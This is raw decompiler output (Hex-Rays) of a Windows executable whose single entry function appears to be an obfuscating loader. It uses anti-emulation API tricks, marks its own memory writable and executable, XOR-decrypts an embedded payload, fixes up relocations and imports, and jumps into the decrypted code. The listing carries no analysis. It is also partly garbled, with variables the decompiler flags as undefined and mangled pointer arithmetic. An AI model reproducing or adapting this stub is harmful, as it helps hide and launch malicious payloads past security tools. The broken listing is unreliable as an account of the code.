/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// int __usercall start@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>);
// BOOL __stdcall AreAllAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// PSTR __stdcall StrChrA(PCSTR pszStart, WORD wMatch);

//-------------------------------------------------------------------------
// Data declarations

char byte_4025E8[] = { '‚' }; // weak
_UNKNOWN loc_402DB8; // weak
int dword_4038C8[206] =
{
  1589273871,
  1823706086,
  28849555,
  1266406115,
  -308971487,
  -1700478963,
  -356390063,
  1835488985,
  1598208208,
  122499889,
  1297994823,
  -389120274,
  -1616460481,
  -268898745,
  1749898239,
  1538178086,
  71905306,
  1322309428,
  -373916580,
  -1633500106,
  -289280192,
  1767723758,
  1421720781,
  188694275,
  1104074831,
  -425102466,
  -1858679931,
  -534781896,
  1737645081,
  1439871599,
  168705631,
  1074780535,
  -412388692,
  -1878930802,
  -520494815,
  1733057791,
  1455010506,
  156384538,
  1136712244,
  -460426926,
  -1817589456,
  -476650820,
  1680039808,
  1444589975,
  162872726,
  1130879697,
  -465866271,
  -1826174551,
  -501619773,
  1705598464,
  1470935087,
  863976479,
  2038820873,
  -556315886,
  -1730166182,
  -400692792,
  1873695775,
  1823705910,
  863962937,
  2038816777,
  -556315898,
  -1445203110,
  -653141824,
  1589273871,
  1823705910,
  863962937,
  2038816777,
  -556315898,
  -1445203110,
  -653141824,
  1589273871,
  1823705910,
  863962937,
  2038816777,
  -556315898,
  -1445203110,
  -653141824,
  1589273871,
  1823705910,
  863962937,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_405000[4096] =
{
  'å',
  '\f',
  'i',
  '•',
  'ê',
  '§',
  ';',
  '2',
  '¶',
  '\x1F',
  '7',
  'E',
  ',',
  '4',
  'ý',
  '5',
  'ã',
  '‰',
  'V',
  '²',
  'Ú',
  'g',
  '_',
  '€',
  'Õ',
  'ë',
  '“',
  'ß',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<ebp>, int a3@<edi>)
{
  int v3; // esi
  HMODULE v5; // eax
  BOOL (__stdcall *AddAce)(PACL, DWORD, DWORD, LPVOID, DWORD); // eax
  int v7; // ebp
  int v8; // ebx
  int v9; // edx
  HMODULE v10; // ecx
  int v11; // edi
  unsigned int v12; // eax
  int *v13; // ebx
  char *v14; // edi
  char *v15; // ebp
  int v16; // ecx
  _WORD *v17; // edx
  unsigned int v18; // ebp
  char *v19; // ebx
  int v20; // ebp
  int v21; // eax
  char *v22; // ebp
  FARPROC *v23; // esi
  FARPROC v24; // eax
  DWORD flOldProtect; // [esp+20h] [ebp-4h] BYREF
  char *retaddr; // [esp+24h] [ebp+0h]
  HMODULE v29; // [esp+2Ch] [ebp+8h]

  v3 = 0;
  if ( !StrChrA("StrChr", 0) )
  {
    v5 = LoadLibraryA("advapi32.dll");
    AddAce = (BOOL (__stdcall *)(PACL, DWORD, DWORD, LPVOID, DWORD))GetProcAddress(v5, "AddAce");
    v7 = ((int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, int, int))AddAce)(0, 0, 0, 0, 0, a3, a2, a1)
       + 28;
    v8 = a3 + 2 * a1;
    if ( !AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
      v7 ^= 0xEu;
    VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect);
    v11 = 4 * a3;
    v12 = 0;
    while ( 1 )
    {
      v8 = v9 + 4 * v8;
      if ( v3 == v7 )
        v3 = 0;
      v9 += (int)v10;
      LOBYTE(v10) = byte_4025E8[v12] ^ byte_405000[v3] ^ 0xEC;
      byte_4025E8[v12] = (char)v10;
      v11 *= 9;
      ++v12;
      ++v3;
      if ( v12 >= 0x1420 )
      {
        v13 = dword_4038C8;
        v14 = &byte_4025E8[-640];
        v15 = 0;
        retaddr = 0;
        while ( 1 )
        {
          v16 = (int)&v14[2 * (_DWORD)v10];
          v17 = v13 + 2;
          if ( (unsigned int)(v13[1] - 8) >> 1 )
          {
            v18 = (unsigned int)(v13[1] - 8) >> 1;
            do
            {
              if ( (*v17 & 0xF000) == 12288 )
              {
                v16 = *v13 + (*v17 & 0xFFF);
                *(_DWORD *)&v14[v16] += &byte_4025E8[-268436096];
              }
              ++v17;
              --v18;
            }
            while ( v18 );
            v15 = retaddr;
          }
          v15 += v13[1];
          retaddr = v15;
          v10 = (HMODULE)&v13[v16];
          v13 = (int *)((char *)v13 + v13[1]);
          if ( (unsigned int)v15 >= 0xE4 )
          {
            v19 = &byte_4025E8[2780];
            retaddr = &byte_4025E8[2780];
            if ( *(_DWORD *)&byte_4025E8[2796] )
            {
              do
              {
                v10 = LoadLibraryA(&v14[*((_DWORD *)v19 + 3)]);
                v29 = v10;
                if ( v10 )
                {
                  v20 = *(_DWORD *)v19;
                  if ( !*(_DWORD *)v19 )
                    v20 = *((_DWORD *)v19 + 4);
                  v21 = *(_DWORD *)&v14[v20];
                  v22 = &v14[v20];
                  v23 = (FARPROC *)&v14[*((_DWORD *)v19 + 4)];
                  if ( v21 )
                  {
                    while ( 1 )
                    {
                      if ( v21 >= 0 )
                      {
                        v24 = GetProcAddress(v10, &v14[v21 + 2]);
                      }
                      else
                      {
                        v24 = GetProcAddress(v10, (LPCSTR)*(unsigned __int16 *)v22);
                        v19 = (char *)v10 + 2 * (_DWORD)v19;
                      }
                      *v23 = v24;
                      v22 += 4;
                      v21 = *(_DWORD *)v22;
                      v14 = &byte_4025E8[-640];
                      ++v23;
                      if ( !*(_DWORD *)v22 )
                        break;
                      v10 = v29;
                    }
                    v19 = retaddr;
                  }
                }
                v19 += 20;
                retaddr = v19;
              }
              while ( *((_DWORD *)v19 + 4) );
            }
            ((void (__fastcall *)(HMODULE, _WORD *))loc_402DB8)(v10, v17);
            ExitProcess(0);
          }
        }
      }
    }
  }
  return 0;
}
// 401078: variable 'v9' is possibly undefined
// 401081: variable 'v10' is possibly undefined
// 4011C1: variable 'v17' is possibly undefined
// 4038C8: using guessed type int dword_4038C8[206];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
